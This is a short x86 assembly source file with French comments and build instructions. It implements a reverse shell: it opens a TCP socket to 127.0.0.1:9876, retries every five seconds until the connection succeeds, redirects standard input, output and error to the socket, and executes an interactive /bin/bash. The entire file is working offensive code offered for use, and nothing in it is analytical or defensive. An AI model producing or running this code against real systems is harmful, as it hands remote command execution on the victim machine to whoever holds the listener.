;Pour comiler : nasm -f elf32 -g reverse.asm && ld -m elf_i386 reverse.o
global _start
section .data
    SHELL       dw      "/bin/bash", 0
    arg1        dw      "-i", 0
    env         dw      "PS1=",34,"\e[0",59,"31m[\u@\h \W]\$ \e[m",34, 0
    parsearg    dd      SHELL, arg1, 0
    perseenv    dd      env, 0 
section .text
_start:

; Creation du socket

        mov eax, 0x66    ;syscall eax en hex

        mov ebx, 0x1     ;SYS_CREATE

        ;Structure de la variable du 3 eme parametre a mettre en haut de la stack
        push 0x0        ; Protocol IP
        push 0x1        ; Type SOCK_STREAM
        push 0x2        ; Domain AF_INET

        mov ecx, esp	;ECX pointe vert la stack
        int 0x80

        mov edx, eax	;File descriptor dans EDX
        jmp _connect_socket

_connect_socket:

        mov eax, 0x66   ;Meme appel system que en haut

        mov ebx, 0x3    ;SYS_CONNECT
        ;Structure de connect()
        ;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

        ;push 0x10
        push dword 0x0100007f  ;127.0.0.1
        push word 0x9426       ;9876
        push word 0x2          ;AF_INET
        mov esi, esp		   ;sauvegarde adresse de la structure qui est dans la stack

        ;mise en forme des argument
        push 0x10   ;16
        push esi
        push edx

        mov ecx, esp
        int 0x80
        ;test de la valeur de retour
        cmp eax, 0x0
        jne _sleep	;fonction dodo de 5 seconde
        jmp _dup

_sleep:
        mov eax, 0xa2	;syscall nanosleep
        push 0x0		;nano seconde
        push 0x5		;seconde
        mov ebx,esp
        int 0x80
        jmp     _connect_socket ;re-tentative de connecter le socket

_dup:

        mov eax, 0x3f	;dup2 syscall
        mov ebx, edx	;file descriptor dans ebx
        xor ecx, ecx	;0 pour STDIN
        int 0x80

        mov eax, 0x3f	;dup2 syscall
        mov ecx, 0x1	;1 pour STDOUT
        int 0x80

        mov eax, 0x3f	;dup2 syscall
        mov ecx, 0x2	;2 pour STDERR	 
        int 0x80
        jmp _exe_bin

_exe_bin:
        mov eax, 0xb ;exeve syscall
        ; int execve(const char *pathname, char *const argv[], char *const envp[]);
        mov ebx, SHELL
        mov ecx, parsearg
        mov edx, perseenv
        int 0x80
